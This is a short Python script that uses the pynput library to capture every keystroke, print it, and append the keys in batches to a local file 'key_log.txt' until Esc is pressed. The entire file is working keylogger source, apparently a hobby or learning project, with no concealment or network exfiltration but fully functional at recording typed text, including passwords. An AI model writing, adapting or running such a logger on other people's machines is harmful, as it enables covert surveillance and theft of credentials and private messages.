import pynput
from pynput.keyboard import Key, Listener

f = open("key_log.txt", "w+")
f.close()
keys_strokes = "key_log.txt"

file_path = "..\\Keylogger"  # His is the location
stretch = "\\"

count = 0
keys = []


def main():
    def on_press(key):
        global keys, count

        print(key)
        keys.append(str(key))
        count += 1

        if count >= 20:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + stretch + keys_strokes, "a+") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(" ")
                elif k.find("Key") == -1:
                    f.write(k)
                elif k.find("enter") > 0:
                    f.write("\n")
                elif k.find("backspace") >= 0:
                    f.write("/")

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
